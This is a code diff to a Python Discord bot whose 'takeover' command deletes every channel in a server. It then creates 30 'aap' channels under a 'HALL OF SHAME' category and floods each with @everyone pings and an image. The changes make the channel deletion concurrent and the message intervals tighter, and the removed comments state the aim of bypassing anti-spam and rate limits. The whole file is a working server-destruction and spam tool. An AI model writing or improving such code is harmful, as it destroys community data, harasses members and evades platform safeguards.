@@ -12,19 +12,16 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 @bot.event
 async def on_ready():
-    print(f"🔥 [HALL OF SHAME MASSIVE BULK READY] Logged in as {bot.user}")
+    print(f"🔥 [ULTRA BULK TAKEOVER READY] Logged in as {bot.user}")
 
 @bot.command(name="takeover")
 @commands.has_permissions(administrator=True)
 async def takeover(ctx):
     guild = ctx.guild
     
-    # 1. Delete all existing channels
-    for channel in guild.channels:
-        try:
-            await channel.delete()
-        except Exception:
-            pass
+    # 1. Delete all existing channels concurrently to ensure maximum speed
+    delete_tasks = [channel.delete() for channel in guild.channels]
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
 
     # 2. Create the 'HALL OF SHAME' category
     try:
@@ -35,31 +32,28 @@ async def takeover(ctx):
 
     # 3. Check for shame.png in the repository
     image_path = "shame.png"
-    file_to_send = discord.File(image_path) if os.path.exists(image_path) else None
+    has_image = os.path.exists(image_path)
 
-    # 4. Create 30 channels named 'aap' and use bulk/async dispatch to bypass anti-spam and ensure every channel gets spammed with @everyone
-    async def process_channel(i):
+    # 4. Simultaneously create all 30 channels and blast messages instantly with zero lag
+    async def create_and_spam(i):
         try:
             new_channel = await guild.create_text_channel(f"aap-{i}", category=shame_category)
             
-            # Prepare a bulk list of messages to bypass ratelimit and spam protection instantly
-            messages_payload = []
+            # Send 5 messages with @everyone and image concurrently per channel
             for _ in range(5):
-                if file_to_send:
-                    file_to_send.fp.seek(0)
-                    # Send with @everyone tag and image
+                if has_image:
+                    file_to_send = discord.File(image_path)
                     await new_channel.send("@everyone 🤣 **HALL OF SHAME** 🤣", file=file_to_send)
                 else:
                     await new_channel.send("@everyone 🤣 **HALL OF SHAME** 🤣 (shame.png not found)")
-                
-                # Minimal sleep to prevent discord gateway disconnect while maintaining maximum speed
-                await asyncio.sleep(0.05)
+                # Extremely tight interval for maximum bulk throughput
+                await asyncio.sleep(0.02)
                 
         except Exception as e:
-            print(f"Channel {i} error: {e}")
+            print(f"Channel {i} execution error: {e}")
 
-    # Run channel creations and spam concurrently using asyncio.gather for ultimate speed and bulk execution
-    tasks = [process_channel(i) for i in range(1, 31)]
-    await asyncio.gather(*tasks)
+    # Launch all 30 channel tasks simultaneously using asyncio.gather
+    all_tasks = [create_and_spam(i) for i in range(1, 31)]
+    await asyncio.gather(*all_tasks)
 
 bot.run(os.getenv("DISCORD_BOT_TOKEN"))
